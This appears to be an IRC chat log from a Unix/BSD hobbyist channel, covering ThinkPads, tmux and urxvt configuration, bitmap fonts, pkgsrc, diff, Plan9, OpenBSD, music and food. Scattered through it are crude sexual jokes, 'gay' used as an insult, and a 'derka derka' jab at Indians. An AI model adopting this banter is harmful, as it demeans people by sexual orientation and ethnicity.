10:23  thang1thang │  I had a dell for my first laptop
10:23  thang1thang │  tore the thing to fucking pieces within a year and a half
10:23        mafia │  http://www.materiamagica.com/community/player-blog/mushclient-scripts.html
10:24  thang1thang │  two keys fell off, couple more were coming off, entire screen could become unhinged on one side, case was cracking open...
10:24        mafia │  Yeah this one is rebuilt, it was starting to get like that xD
10:24  thang1thang │  nope, the url thing isn't working ._.
10:24  thang1thang │  darn it...
10:25        mafia │  that sucks :/
10:25  thang1thang │  I bought a macbook pro after that dell because I was so pissed off at having my laptop literally fall apart like that
10:25  thang1thang │  oh yeah, trackpad didn't work either
10:25     ne0phyte │  *cough* thinkpad *cough*
10:25        mafia │  thinkpads are awesome
10:25     ne0phyte │  ThinkPads are Linux friendly, sturdy, repairable
10:25  thang1thang │  thinkpads are amazing, but I also wanted a mac for the unix architecture of the OS, and because it was metal, unibody and had a nicer battery life than most thinkpads
10:26        mafia │  I almost bought one just last month actually
10:26  thang1thang │  this was also before I really understood linux :p
10:26     yrmt|away│  yrmt
10:26       phyrne │  Sorry I went quiet guys, was speaking with a colleague
10:26       phyrne │  Wheyyy it's yrmt
10:26  thang1thang │  to be honest I'm really debating whether I should upgrade to a new mac or not...
10:26     ne0phyte │  I only buy ThinkPads
10:26         yrmt │  What's up guys
10:26        mafia │  nottinngg
10:26     ne0phyte │  never had any problem that I couldn't solve/repair myself (I buy used ones, they are A LOT cheaper)
10:27     ne0phyte │  just recently upgraded the screen in my x201 to an AFFS one (similar to IPS). awesome viewing angle \o/
10:27  thang1thang │  I almost always suggest three types of laptops to people: Mac if that's what they want, Mac if they want something to 100% always work and never need to touch anything. Thinkpads if they want something cheap and works forever. (insert latest really sturdy ultrabook) for those who want a windows laptop that's "as good as a mac"
10:27         yrmt │  I feel like shit]
10:27     ne0phyte │  _cheap_
10:28  thang1thang │  and niiice, gj on dat screen upgrade
10:28     ne0phyte │  You know high end ThinkPads are as expensive as Macs?
10:28  thang1thang │  dumb question. Does upgrading the screen increase possible resolutions?
10:28     ne0phyte │  depends on the model
10:28  thang1thang │  And yeh, I do, but the types of thinkpads I recommend are the ones that are the solid, dependable core2duo models that you can still upgrade to 8GB of ram and are only like $250 on ebay :p
10:28     ne0phyte │  the x201 is rather old (I got a first gen i3 2x2.6, 8Gb RAM)
10:28     ne0phyte │  so I am stuck with 1280x800
10:28     ne0phyte │  but thats fine with the right WM and multiple workspaces
10:29  thang1thang │  eh, not bad, I'm at 1280x800 on my mac. I don't even feel limited by my screen resolutoin tbh
10:29     ne0phyte │  I am used to 2x 1080p at home (one in portrait mode). so I feel VERY limited :D
10:29  thang1thang │  the fact that it's 13" only becomes cumbersome if I want to have more than 5 things on my screen at once. But I've never needed that many things on the screen at once...
10:29        mafia │  lol
10:29     ne0phyte │  my x201 is 12.1"
10:30  thang1thang │  And even then, I can almost always just drop 3 of those windows into a single tmux pane and save tons of space visually
10:30  thang1thang │  welp shit it's 1:30am
10:32        mafia │  is it?
10:32        mafia │  time flys
10:32  thang1thang │  yeah it is lol

10:45     ne0phyte │  well try to drop an acer
10:45        mafia │  ^oh god
10:45       phyrne │  yrmt: How the hell did you drop it?! :p
10:45     ne0phyte │  or a non-business hp 
10:45       phyrne │  hahah
10:46         yrmt │  gf showed me her vag iirc
10:46     ne0phyte │  HOLY SHIT WHAT IS THAT *throws MBP away*
10:46         yrmt │  ahaha
10:46         yrmt │  I cried and ran like a dog
10:47       phyrne │  "showed me her vag"
10:47         yrmt │  Jokes, I just dropped it off my bed
10:47     ne0phyte │  "yo yrmt hold my iPhone. I need a new one" *drops pants*

10:49  thang1thang │  lol
10:49  thang1thang │  anyway that's a damn nice screen, mafia
10:49  thang1thang │  but the fuck are you doing using solarized?
10:49  thang1thang │  those orange and yellow colors make my eyes bleed
10:50     ne0phyte │  Nope its not solarized. Anyway brb
10:50  thang1thang │  really? meh...
10:50  thang1thang │  yeah you're right, it's a little off. Which one is it then?
10:52  thang1thang │  what the fuck was that a chick thing?
10:55  thang1thang │  wheeeeeee 2am, gnight y'all
10:55  thang1thang │  going to wake up at 7 fricking am and go to class and hate myself and hopefully ace my damn test
10:58        mafia │  reply oh thanks and no it's not solarized, solarized is light as fuck with wayyy different colors. I made this theme :p
10:58  thang1thang │  weird. Dunno why I thought it was solarized :p
10:58        mafia │  idk why I typed reply..
10:58        mafia │  xD
10:58        mafia │  but night!
10:58  thang1thang │  and there's a solarized with a blue background and orange text colors...
10:59        mafia │  Yeah I don't have a blue background, wait which scrot?
11:00        mafia │  I have so many, which one are you talking about :o we might be talking about different ones
11:00  thang1thang │  uhm, scrollback isn't working on irssi for some reason ._.
11:00  thang1thang │  anyway, I'll find it in the browser history lol
11:00  thang1thang │  http://imgur.com/a/FDdU9#1
11:00  thang1thang │  that one
11:02       phyrne │  I'm beeeeek
11:02     ne0phyte │  I usually use monokai
11:02        mafia │  thats not mine :o
11:02        mafia │  haha
11:02  thang1thang │  lol
11:02  thang1thang │  mah bad
11:03        mafia │  haha where did you find that? :p
11:03  thang1thang │  hell yeah got vi-mode in tmux :3
11:03  thang1thang │  and sumbody posted it in the irc talking about thinkpads ._.
11:03  thang1thang │  thought it was you?
11:03        mafia │  oh no must of been ne0
11:04  thang1thang │  mm, might've been
11:05  thang1thang │  so now I have vi mode in tmux working. I have copy-buffer synced between tmux and the system clipboard. All I need is da url thing
11:05        mafia │  can I see your line for copying also? in tmux
11:06  thang1thang │  sure. Copy line:
11:07  thang1thang │  bind-key -t vi-copy v begin-selection
11:07  thang1thang │  bind-key -t vi-copy y copy-pipe "xclip"
11:07  thang1thang │  bind-key -t vi-copy y copy-pipe "xclip" 
11:07  thang1thang │  whoops, accidentally pasted that last line twice lol
11:07  thang1thang │  anyway, the paste line from the .tmux.conf is:
11:07  thang1thang │  bind-key -t vi-copy y copy-pipe "xclip" 
11:08        mafia │  ah I see ty :P
11:08  thang1thang │  I also unbound [ and set: bind Escape copy-mode
11:08  thang1thang │  so now I hit prefix - escape to go into copy mode in tmux (vi bindings) and hit q to exit out
11:11         yrmt │  lol, dwm hasn't been updated since 2011?
11:11  thang1thang │  I guess so
11:11  thang1thang │  lol
11:14     ne0phyte │  Mafia I'm on my phone. Brb at my pc. Dunno what theme it is, its one of the themes that come with sublime text (don't hate)
11:15        mafia │  I won't lol
11:16  thang1thang │  sublimetext
11:16  thang1thang │  wut

11:20     ne0phyte │  oh god I hate the OS X font rendering so much
11:20  thang1thang │  lol
11:20     ne0phyte │  yeah yeah they scale fonts linearly and all
11:20        mafia │  me too
11:20     ne0phyte │  but those bold, blurry texts
11:21         yrmt │  ne0phyte: wut
11:21       phyrne │  Working on dwm for our repo? :) Nice
11:21     ne0phyte │  too bad people missed that all those fonts were never meant to be used on screens. pixel perfect, aliased bitmap fonts are just so much nicer to the eye
11:21         yrmt │  your font is shit
11:21  thang1thang │  lol
11:21       phyrne │  :p
11:21     ne0phyte │  that screen is not my font

11:29  thang1thang │  It used to already be in there iirc?
11:29       phyrne │  The Save OS X repo?
11:29         yrmt │  it was there already
11:30       phyrne │  Oh... lul
11:30  thang1thang │  I remember downloading it on my mac once, I could never get it running proper how I liked it but it was in there
11:30         yrmt │  I just updated it though
11:30         yrmt │  no more warnings on build
11:30         yrmt │  same for herbstluftwm
11:30       phyrne │  Nice
11:31         yrmt │  I'll do monsterwm now
11:31       phyrne │  :)
11:34  thang1thang │  mmm, me stupid
11:34  thang1thang │  how do I make my font size bigger in the terminal with urxvt?
11:34  thang1thang │  I don't actually have a font set in the .xresources...
11:35       phyrne │  thang1thang2: Depends if you're using xft or not
11:35       phyrne │  With xft it's just 'xft:FontName:pixelsize=10'
11:35  thang1thang │  if I'm not setting any font preferences or anything  inside .xresources, I should not be using xft by default right?
11:36       phyrne │  How have you spcified the font size? I'd just advise consluting the Arch Wiki on this
11:36       phyrne │  thang1thang2: https://wiki.archlinux.org/index.php/Rxvt-unicode :)
11:37       phyrne │  It's got a link to the Xresources page
11:37  thang1thang │  uhh, I don't have _anything_ specified as far as font size goes
11:37  thang1thang │  I have a select script thingey, term name set, color scheme, save lines, scroll bar off and that's like.. it
11:37       phyrne │  So, you're just using the default font given to you?
11:37         yrmt │  brb
11:38  thang1thang │  yup
11:38  thang1thang │  (don't hate)
11:38       phyrne │  Like I said
11:38       phyrne │  Consult the Arch Wiki pages
11:39       phyrne │  May as well read some docs and learn yourself rather than just getting an answer
11:39  thang1thang │  lol. I did, I just wanted to make sure I hadn't skipped over some "oh just set size=xx" setting
11:39  thang1thang │  since the only other option was to define a font myself and size the font, and I didn't feel like going down the "best font for coding" rabbit hole at 2:40am
11:39     ne0phyte │  yrmt: this is what my font looks like http://i.imgur.com/y48RB3A.png
11:39    crshd|gone│  crshd
11:39     ne0phyte │  especially on smaller screens (resolution wise) bitmap fonts are way better than that blurry OS X font rendering :<
11:40  thang1thang │  dat is a really nice font
11:40       phyrne │  Archey and Cowsay in one screenshot? The cancer, it's too much
11:40     ne0phyte │  :D
11:40     ne0phyte │  of course
11:40         yrmt │  hurts my eyes
11:40     ne0phyte │  my two most used applications of course
11:40  thang1thang │  lol
11:41     ne0phyte │  yrmt: really? o.O
11:41  thang1thang │  yrmt: the font or the archy/cowsay thing?
11:41     ne0phyte │  probably the latter ;)
11:41         yrmt │  colors
11:41  thang1thang │  but anyway, ne0, what font are you using?
11:41     ne0phyte │  the Proggy family. mostly ProggyCleanTT
11:42     ne0phyte │  ProggyTinyTT for xmobar
11:42     ne0phyte │  sadly the website has been offline for a few months (http://www.proggyfonts.com)
11:43     ne0phyte │  but you can get them here http://kaictl.net/software/proggyfonts-0.1.tar.gz
11:44  thang1thang │  you have to set it to size=12 right? (bitmap fonts can't be sized larger or they'll look weird, iirc?)
11:44     ne0phyte │  yep
11:44     ne0phyte │  if you try to scale them they look awful
11:44     ne0phyte │  not as awful as OS X
11:44     ne0phyte │  but close
11:44     ne0phyte │ ducks
11:44  thang1thang │  lol
11:44  thang1thang │  :q
11:44     ne0phyte │  no seriously don't scale them
11:44  thang1thang │  I wouldn't
11:44  thang1thang │  I've seen some people try to scale them ._.
11:45     ne0phyte │  thats why there are different sizes
11:45     ne0phyte │  ProggyCLean ProggySmall ProggyTiny ProggySquare etc
11:46         yrmt │  Gah, I have to learn sed
11:46         yrmt │  because pkgsrc has a substitution framework builtin with sed
11:46  thang1thang │  lol
11:47        mafia │  im gonna get some sleep later o/
11:47         mafia│  mafia|Zzz
11:48  thang1thang │  mmm. Since it's bitmap I wouldn't include them into the urxvt with xft right?
11:48  thang1thang │  or is xft either/or?
11:49     ne0phyte │  xft is x freetype for scalable fonts. the proggy font comes as ttf and pcf
11:50     ne0phyte │  you should be able to use both
11:50     ne0phyte │  I mean xft or the apropriate x11 font string
11:50     ne0phyte │  then again I don't use urxvt
11:51     ne0phyte │  I guess xft:ProggyCleanTT should suffice
11:51         yrmt │  fuck pkgsrc uses another sed than the one I'm used it
11:51         yrmt │  to
11:52  thang1thang │  yeah, I was thinking that. If I use the "bitmap only" way of specifying a font, I have to use some long-ass x-x-^--^-bullshit-^-morebullshitx-----^-hyphenshit- name
11:54     ne0phyte │  btw
11:54     ne0phyte │  to find a fontstring
11:54         quit │  shtr0m
11:54     ne0phyte │  xlsfonts | grep -P 'proggy'
11:54  thang1thang │  huh, thanks, I'll have to remember that one
11:54     ne0phyte │  xlsfonts prints all fontstrings (well all fonts in all variations) available
11:54  thang1thang │  and by remember I mean write that shit down in my "useful commands.txt" I keep now that I have linux :p
11:55     ne0phyte │  it's easy to remember :P x list fonts
11:55  thang1thang │  you underestimate my power of forgetfulness
11:55     ne0phyte │  :D
11:58     ne0phyte │  also if you look for a program to look through your fonts check fontmatrix (thats the one I use)
11:58     ne0phyte │  I believe there are more lightweight ones, but I like fontmatrix
11:59       phyrne │  yrmt: Does your gitbot have to join and part upon each message? :p
12:00         yrmt │  yep
12:01         yrmt │  so my sed line works
12:01       phyrne │  gayyyyyyyyy
12:01         yrmt │  but it's from the makefile it doesn't work because I'm using $ to match the end of the line
12:02  thang1thang │  I'm honestly not looking for a program for my fonts really
12:02  thang1thang │  I don't seem to do any design what so ever on linux, barely even any autoCAD type of stuff. 
12:02  thang1thang │  I kinda left all of that when I dropped OS X. I'd reinstall OS X to do that stuff. It's much nicer for design/font type of stuff (with photoshop, etc)
12:03         yrmt │  oh wait, in a makefile I simply have to use $$ for $
12:03         yrmt │  so, fixd
12:03       phyrne │  :p
12:04         yrmt │  wait
12:04         yrmt │  no
12:04  thang1thang │  perfect
12:04  thang1thang │  I got my tmux really sexy now
12:04     ne0phyte │  mh?
12:04  thang1thang │  I have it so I hit prefix, then ctrl 
12:04       phyrne │  So annoying when there's partial audio in different ears in songs :( Means when I'm working I can't hear some stuff so songs sound empty
12:04  thang1thang │  and I can type h j k l to switch through panes
12:04  thang1thang │  without having to hit ctrl again
12:04  thang1thang │  or I could type prefix + h j k l to resize the windows
12:05     ne0phyte │  I should finally learn tmux.
12:05  thang1thang │  I also set the pane-base-index to 1 so windows don't start with 0 (that bugged me really badly) and renumber-windows is set to 1
12:05  thang1thang │  so that way when I delete sessions, the windows renumber logically
12:06  thang1thang │  But yeah, tmux is awesome. I barely scratch the surface of it and it's already 10x more useful for me than just urxvt alone
12:06       phyrne │  As much as my brain knows it should be '0', it just doesn't work well with the keyboard :p
12:06  thang1thang │  it's more of a natural number vs real number thing for me
12:06  thang1thang │  I'm like "well I start counting from one, damnit"
12:07     ne0phyte │  as a programmer for me counting starts with 0. It represents a value just like 1 and 2
12:08  thang1thang │  yeah I get that too, and counting starts for me with 0 in just about everything else, but when I open a window in tmux, I expect it to start with 1 because there's 1 window
12:08     ne0phyte │  it's the data it represents, not a set of things
12:08        dami0 │  it's an array of windows
12:08        dami0 │  it's therefore window[0]
12:08  thang1thang │  I'm not saying I make sense, I'm saying my brain thinks that way :p
12:09        dami0 │  I know, I find that thinking about it like that helps me
12:09  thang1thang │  it's logical for me to think of it as window[0] -> tmux running as a daemon in the background => window[1] is opening the window
12:09  thang1thang │  so I set the preferences that way :p
12:09     ne0phyte │  your explanation doesn't make sense. the first thing is at index zero
12:09     ne0phyte │  so 0 to me makes sense. but it's uncomfortable to hit
12:09     ne0phyte │  compared to 1,2,3,4..
12:09  thang1thang │  yeah, there's definitely that as well
12:09       phyrne │  It makes sense if you think of it like this: boner[honey]
12:10        dami0 │  hue hue
12:10     ne0phyte │  boner times vagina equals multibogina?
12:10       phyrne │  yrmt: You know what am talkin' bout right?
12:10       phyrne │  ne0phyte: totez
12:10  thang1thang │  damn
12:10       phyrne │  Sorry, thought I'd derail that conversation, it was depressing
12:10  thang1thang │  y'all just turned into 14 year old teenagers in, like, 3 seconds
12:11        dami0 │  too cold :<
12:11     ne0phyte │  huh?
12:11       phyrne │  thang1thang2: Shutup boner
12:11  thang1thang │  fiteme mr. Totez
12:11        dami0 │  ok, it's warmed up, nevermind
12:11  thang1thang │  well that was fast
12:11       phyrne │  thang1thang2: Square'go like
12:11     ne0phyte │  lol thang1thang2 you said that the first window should be 1. and you call us teenagers
12:11     ne0phyte │  pffft
12:11  thang1thang │  almost like you applied a large amount of friction to a small area rapidly...
12:12       phyrne │  hue
12:12        dami0 │  no, that comes later.
12:12       phyrne │  no pun intended right?

12:09        dami0 │  yaaaay, it's raining
12:10       phyrne │  vompatti: Yeah that
12:10         yrmt │  phyrne: nice
12:10       phyrne │  *'s you though....
12:10       phyrne │  dami0: u need not to portray arrogance and consider that some people learn in different ways and actually like owning books
12:10       phyrne │  yrmt: :) At least someone appreciates that I'm excited
12:11        dami0 │  phyrne: I was taking a crack at python, saying it's too simple for a book
12:11        dami0 │  not at you
12:12         yrmt │  phyrne: you should learn programming before you learn python though ;p
12:13     vompatti │  how would he do that? he needs some language to achive that
12:13     vompatti │  achieve*
12:13        dami0 │  wait what? I thought you knew programming already phyrne 
12:13        dami0 │  otherwise, yeah ok. I get the book
12:13         yrmt │  Also, runawk is awesome
12:13         yrmt │  vompatti: wut
12:13         yrmt │  you must learn basics and algorithmic before learning programming
12:13       phyrne │  dami0: Nope, only bash/sed and a bit of awk... and you can't really call that programming ;) heh
12:14        dami0 │  inorite? don't even have floats
12:14     vompatti │  he'll learn it by learning
12:14     vompatti │  s/learning/doing/
12:14     vompatti │  programming
12:14        dami0 │  although I wish I bothered with shell scripting
12:14     vompatti │  w/e
12:14       phyrne │  yrmt: This book is an introduction to the notions and concepts in programming, and learning with Python :)
12:14         yrmt │  -but
12:14         yrmt │  it's the hard way
12:14       phyrne │  yrmt: top kek
12:14     vompatti │  it's the easy way
12:14     vompatti │  learn by doing
12:15       phyrne │  yis :)
12:15       phyrne │  It's a somewhat misleading title, a play on words
12:16        dami0 │  why, is one of the authors name richard hard?
12:16       phyrne │  dami0: Yeah, shell scripting is all I've ever done. I had an idea for a program I wanted to write last week. With the features I wanted to implement, doing it in shell script just didn't make sense. So I decided to learn Python :)
12:17        dami0 │  python is really nice for that. 
12:17        dami0 │  I learned fortran, then learned programming using python
12:18        dami0 │  http://i.imgur.com/UVMV7ZB.gif tfw
12:18       phyrne │  :D Well, I'm sure I'll love Python, considering the ideas I have for things but then find myself restricted by the shell.
12:19       phyrne │  dat gif, what even
12:19        dami0 │  I made like, a tenth of a game in it. you'll be fine bruh
12:19        dami0 │  I don't know
12:19       phyrne │  ;D
12:19       phyrne │  Got a great idea for a program I want to write, so it'll be nice having something to apply it to
12:20        dami0 │  definitely. one of the worst things when learning programming is not knowing what to do
12:21      bottomy │  don't understand how people can run out of things to do :/
12:21       phyrne │  dami0: Absolutely
12:23       phyrne │  bottomy: I think it's partly not being familiar with a language :) Like, if you don't know what you could be capable of with the use of a language, you don't contemplate what you might be able to achieve. At least that's my opinion from the perspective of someone who doesn't program. I simply started thinking of a shell script, which grew into a much bigger idea, at which point I decided it had completely outgrown the shell's ...
12:23       phyrne │  ... capabilities... at least in a convenient and clean manner. I'm jus babbling now though
12:25       phyrne │  Ughhh, I'm listening to the head of one of the dev teams explain to his two new C++ devs (who were apparently very experienced) the concept of diffs, and even what the 'arrows' mean :|
12:26        dami0 │  diffs/
12:26        dami0 │  ?* Is it pointing to parts of a struct?
12:27       phyrne │  dami0: He's explaining how git works. And by the sounds of it, they are unfamiliar with the basic concepts of diff, and its output format
12:27      bottomy │  a lot of people beginning don't actually even use VC :s
12:28        dami0 │  VC's? OOoooh. Well, I don't either. then again, I never bothered to rtfm
12:28       phyrne │  bottomy: Yeah, but these guys are fairly experienced! D:
12:28      bottomy │  so I can see how they could be good C++'ers but know nothing about VC
12:28        dami0 │  isn't it just < old and > new?
12:28       phyrne │  ^ pretty much :p
12:29      bottomy │  I didn't use VC till like my 5th or 6th language lol
12:29        dami0 │  is git a vc? i've heard it called a versioning system
12:29     vompatti │  does anyone now if there is "vim mode" for the firefox's developer tool(console/inspector/style editor)?
12:29       phyrne │  bottomy: But, I'm getting at the fact that they don't know about diff D:
12:30        dami0 │  phyrne: did they use git before though?
12:31       phyrne │  But.... diff isn't just for git
12:31       phyrne │  brb, gots a meeting :)
12:32        dami0 │  \o
12:32        dami0 │  i've only ever seen diff in git
12:32         yrmt │  wut
12:33         yrmt │  diff are used everywhere all the time
12:33        dami0 │  maybe I'm thinking of something else, but don't remember it anyhow
12:34      bottomy │  dami0: diffs are used in git, but it's also a concept in itself
12:34        dami0 │  i figured that. I just don't remember encountering it anywhere else
12:35        dami0 │  TIL: diff is a core-util
12:36      bottomy │  yeh though there's many different diffs (different output styling, etc.)
12:36         yrmt │  lrn2base tools
12:36         yrmt │  bsd diff -u
12:36         yrmt │  master race
12:36        dami0 │  yrmt: I don't learn shit. I *DO*
12:36         yrmt │  you still didn't know about diff
12:36      bottomy │  yeh -u is much nicer
12:37         yrmt │  which is an essential tool in the base
12:37        dami0 │  i did, just not it's util implementation
12:38       phyrne │  I'm beeeek, that was quick :)
12:38       phyrne │  Oh, we're still talking about diff? :p What have I started?
12:38         yrmt │  heh
12:39      bottomy │  brings up diffs and leaves = terrible human being
12:39       phyrne │  Whelp, I'll brb again...
12:39       phyrne │  bottomy: Haha ;D
12:41        dami0 │  phyrne: just take us with you, say we're your braintrust
12:42      bottomy │  lol

13:05        dami0 │  it was? you've spent pretty much all morning talking to use

13:52     ampharos │  l4d2 is getting me into pc gaems a bit
13:53       phyrne │  They started the first machinima, called 'Red vs Blue' using Halo. I'm not into Machinima, but they ended up founding a sort of "entertainment" company (I don't even know how to put it), but they're certainly a collection of some of the funniest people to listen to. So their podcast is awesome. I don't dig much of their other content, but the conversations on the podcast are amazing

18:20         yrmt │  yeah orchestra is gud
18:20         yrmt │  Dream Theater is annoyingly self indulgent and Mike Portmoy is way overrated. Radiohead isn't prog and they are unlistenable.
18:20         yrmt │  so fucking true
18:20         berk │  absolutely
18:20         berk │  dude
18:21         yrmt │  Tool is overrated and is basically safe prog rock for people who don't normally listen to prog rock.

18:21     ampharos │  i've never heard a song but i hear people obessed obver them
18:21         yrmt │  I think overall Steven Wilson's music is too depressing to listen to.

18:22         yrmt │  I hate porcupine/mars volta prog
18:22         yrmt │  it's just sad
18:22         yrmt │  Birds & Buildings is where it's at
18:22         yrmt │  only if they could make a calm album a bit more canterbury
18:23     ampharos │  modern prog sounds more prententious and dream-theater like
18:23         yrmt │  Also, I dislike Rush
18:23         yrmt │  ampharos: yeah
18:23         berk │  "I like Phil Collins' singing. "
18:23         berk │  Hahahah true
18:23     ampharos │  what about some non-proggy but similar bands: tame impala and swans?
18:24         berk │  tame impala is good
18:24     ampharos │  i kinda like rush
18:24     ampharos │  they;re one of the few bands hard rock and prog rock fans can agree with liking
18:24         yrmt │  I dislike Opeth a lot too

18:26         yrmt │  I need original
18:26         berk │  It's very hard to be original
18:26         yrmt │  Carl Palmer is not that good but needed to be whereas Nick Mason isn't good but didn't need to be (Ringo Starr syndrome)
18:27         yrmt │  hmm
18:27     ampharos │  -On the back of the last one, post-rock and math-rock are more "prog" than current prog
18:27         yrmt │  I think Palmer beats Mason 
18:27         yrmt │  ampharos: true
18:27         berk │  mason is uninteresting
18:27         yrmt │  Palmer is excessive
18:27         yrmt │  and pretty bad
18:28         yrmt │  His best work was in The World Of Arthur

18:28         berk │  wtf is musicient
18:28     ampharos │  how do we describe differences between canterbury/classic prog and modern mars volta style prog?
18:29     ampharos │  mars volta tries to be epic and psuedo-avant-garde
18:29     ampharos │  classic stuff stays close to traditional rock instrumentation and is kinda low key
18:29         yrmt │  yeh
18:30         berk │  the thing with the 70s was..
18:30         yrmt │  My answer
18:30         yrmt │  True prog is 70s Canterbury music like Soft Machine, Hatfield & The North, Gilgamesh, Egg, Matching Mole, ...
18:30         berk │  it was all sincere. there were no fear of screwing up, everybody was experimenting..
18:31         berk │  nowadays, the music is so synthetic, you can't feel the effort
18:31         yrmt │  yeah
18:31     ampharos │  the soul is gone
18:32         yrmt │  ampharos: try Birds & Buildings srsly
18:32         yrmt │  these guys are prog
18:32     ampharos │  every playback of a guitar was unique
18:32         yrmt │  it's a bit intense though ;p
18:32     ampharos │  there was always little variances and imperfections every time $guitar_player played
18:32     ampharos │  and the effort and coordination of playing instruments
18:32       phyrne │  Fucking BSDNow isn't up on the Podcast app yet D: I wanted to listen to it on the way home

19:51      gurhush │  even though it's part of the OpenBSD project
19:51         yrmt │  well of course
19:51      gurhush │  so what is the issue
19:51         yrmt │  OpenSMTPD, PF, ...
19:51      gurhush │  pf ;-;
19:51         yrmt │  It's not only OpenSSH :p
19:51      gurhush │  but someone brought up OpenSSH
19:51      gurhush │  I wasn't insinuating that OpenBSD wasn't a big loss
19:52         berk │  They could downscale
19:52         berk │  maybe lower the count of supported platforms
19:52      gurhush │  that would make more sense anyways
19:52         berk │  reduce build machines
19:53         berk │  reduce electric usage
19:53         yrmt │  damn theo can't ask for money properly
19:53      gurhush │  perhaps entirely ditch OpenBSD and just make pf modular and maintain OpenSSH and OpenSMTPD

19:54      gurhush │  wtf, I've only heard that here

20:07      bottomy │  gurhush: oh if it's going to be say art + text then that could work though I'd suggest just going straight to 2D, but if the difference from ASCII to the graphics version will be a lot then I wouldn't suggest bothering with making an ASCII version as it could involve restructuring a lot of the pipeline you create
20:07       Ypnose │  merguez + ribs are OK (lets hope I'll be hungry)

20:10         BigE │  NeoTerra: did you enable the rignup requirement again or is the IRC open?
20:10      bottomy │  gurhush: and since you mentioned it would be tile based, I really wouldn't recommend making it ascii based (especially if it will be realtime, if it won't be then still could involve quite a lot of restructuring and rewriting of your pipeline so just more work).
20:10         BigE │  signup*

20:12      gurhush │  bottomy: have a link to a basic tutorial to create basic sprites and stuff of that sort in GIMP then? Or whatever you consider okay enough assets for a prototype

20:12       phyrne │  I know :p
20:12         yrmt │  It's probably what we're going to see at FOSDEM
20:13       phyrne │  Good, I look forward to it :D
20:13       Ypnose │  NeoTerra: do you think we could have CertFP on unixhub?
20:13      bottomy │  gurhush: well basic level prototype art could simply be coloured boxes/other objects. if you want to still have basic art but a bit more flair then just attempt to draw some of the things yourself how you would like even if they don't turn out that well.
20:13     NeoTerra │  Ypnose now there's an interesting idea...
20:13      bottomy │  gurhush: anyway what kind of art style?
20:14     NeoTerra │  Ypnose I am going to look into that, that sounds like an excellent idea!
20:14         yrmt │  I'll bbl in like an hour and a half

12:38         yrmt │  much more robust
12:39         yrmt │  Mine has a 20 minutes battery though

12:39         yrmt │  It's also old but perfect for BSD

17:34       libbro │  I used regular Plan9
17:34    publicfig │  I need to get back into working with Plan9, I loved it last time I used it

17:36      jjumbii │  nah, it's pretty much the same
17:36      jjumbii │  plan9 is really easy as fuck
17:36      jjumbii │  just takes a major learning curve

17:37      jjumbii │  publicfig: i love it man
17:40         dcat │  how's driver support on plan9?
17:41      jjumbii │  pretty awful tbh
17:41      jjumbii │  but for graphics, vesa can do pretty much everything
17:41      jjumbii │  i used vesa and it was snappy as shit
17:41      jjumbii │  and my network drivers worked
17:41         dcat │  what resolution though?
17:41      jjumbii │  i used 1280x1024x32
17:42         dcat │  ah
17:42      jjumbii │  since I had a monitor with that native resolution it worked out perfect :)
17:43       libbro │  jjumbii: Okay m8
17:43       libbro │  jjumbii: I'll install Plan9 and use it fervently for a week

17:46         dcat │  we laugh about it now, but when the cylons take over ...

17:47         dcat │  libbro: openbsd
17:47         dcat │  freebsd has too much imo
17:49      jjumbii │  freebsd is the shit 
17:49      jjumbii │  pkgng is master race
17:49         dcat │  but ... linux emulation

17:51         yrmt │  :)
17:51         dcat │  I'm really interested why people have a problem with openbsd
17:51         dcat │  personally, I don't see it
17:51      jjumbii │  well i like ports
17:51       phyrne │  dcat: Meh, all down to personal preferences at the end of the day I guess
17:51      jjumbii │  and updated software
17:51       phyrne │  jjumbii: openbsd has ports too brah
17:51       phyrne │  :p
17:51      jjumbii │  small though

17:52         yrmt │  openbsd ports are lel
17:52       phyrne │  hop on current and you've got the latest shit all the time
17:52         yrmt │  they should've used pkgsrc 
17:52       phyrne │  yrmt: I don't use them, but, when I have done here and there in the past, they work fine
17:52       phyrne │  So, they do their job
17:53         yrmt │  There aren't many
17:53       phyrne │  Meh, I guess that's one of the reasons OpenBSD speaks to me
17:53       phyrne │  I love the simplicity, and the range of packages available are all I need
17:53       phyrne │  No fuss
17:53       phyrne │  All a matter of personal preference though
17:54         dcat │  yeah
17:54       phyrne │  When I used FreeBSD fairly recently, on 10 rc3, I quite enjoyed it :)
17:54         dcat │  but it really interests me why people don't like it
17:54         dcat │  I'd like to see it from their perspective
17:54       phyrne │  Thank fuck for the push on pkgng
17:54       phyrne │  dcat: Yeah I know what you mean :p
17:57         yrmt │  I wish pkgsrc would move from g95 to gfortran
18:00        dami0 │  isn't g95 the better sun systems compiler?
18:00         yrmt │  no idea
18:00         yrmt │  I just know I'm having a hard time fixing the port for it
18:02         dcat │  yrmt: how long have you been working on it?
18:03         yrmt │  I just started

19:32       fenriz │  i have quit eating red meat
19:32       fenriz │  the sound of cheeseburgers is still very enticing
19:32        dami0 │  yeah, red meat is bad
19:32        dami0 │  tastes good, but so bad
19:32       fenriz │  dami0: glad you understand.
19:33       fenriz │  i had to fight tooth and nail with my will when I see a steak.
19:33        dami0 │  dem darth farts mane

19:34        dami0 │  fenriz: it's sirloin or nothing
19:34       fenriz │  haha
19:34       fenriz │  any par tof the cow is good for an asian.
19:34       fenriz │  eyes?  we'll eat it
19:35       fenriz │  tongue, yup.
19:35        dami0 │  unless you're indian.
19:35       fenriz │  intestines?  hell yeah
19:35       fenriz │  oh yeah, for sure.
19:35        dami0 │  then it's all derka derka, cow holy!
19:35       fenriz │  but if i was indian, i would be drowning myself in butter shicken.
19:36        dami0 │  i need to get me some shicken
19:36         shix │  fenriz: just what i was thinking of
19:36       fenriz │  hahaha
19:36       fenriz │  shix + chicken = shicken
19:36        dami0 │  but what's butter shicken?
19:36       fenriz │  typo :P
19:36        dami0 │  i know, still; butter chicken/
19:36        dami0 │  is it really just chicken covered in butter?
19:36       fenriz │  wait, you dont know what butter chicken is?
19:36       fenriz │  dami0: you are in UK right?
19:36        dami0 │  yh
19:37        dami0 │  I don't eat british food though
19:37       fenriz │  even worst!
19:37       fenriz │  you should know about it then.
19:37       fenriz │  okay, UK has a pretty populous indian population
19:37       fenriz │  so i suggest you go try it
19:37       fenriz │  butter chicken is amazing.
19:37        dami0 │  plenty of people say "oooh! try this"
19:37       fenriz │  i'm a sucker for fish and chips.  i dont know how british that is though.
19:37       fenriz │  no but dude, it's not just a casual "try this".  it's a game changer.
19:37        dami0 │  then before you know it you're running plan9 on mips scrambling for wifi drivers at 3am
19:38       fenriz │  hahaha
19:38       fenriz │  well, i bet that was thankts to jjumbii 
19:38        dami0 │  fish & chips is the staple of the working labourer's breakfast
19:38        dami0 │  nah, I never did run plan9. went as far as openbsd and turned back
